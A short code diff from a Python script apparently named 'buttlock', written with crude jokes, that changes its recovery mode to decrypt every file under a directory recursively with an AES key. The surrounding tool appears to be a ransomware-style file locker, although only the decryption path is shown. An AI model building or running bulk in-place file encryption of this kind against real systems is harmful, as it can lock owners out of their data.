@@ -59,10 +59,14 @@ def buttlock(mode, dir, recovery, replace):
             source_dir = abspath(dir)
             print("un-dicking all files in: " + source_dir)
 
-            with open("./temp/butt.txt", "rb") as encrypted_input:
-                decrypted = buttcrypt.decryptContent(decrypted_aes_key, encrypted_input.read())
-                with open("./temp/butt.txt", "wb") as out_file:
-                    out_file.write(decrypted)
+            files = [f for f in glob.glob(source_dir+"/**/*.*", recursive=True)]
+
+            for file in files:
+                with open(file, "rb") as encrypted_input:
+                    decrypted = buttcrypt.decryptContent(decrypted_aes_key, encrypted_input.read())
+                    with open(file, "wb") as out_file:
+                         out_file.write(decrypted)
+
 
 
 if __name__ == '__main__':
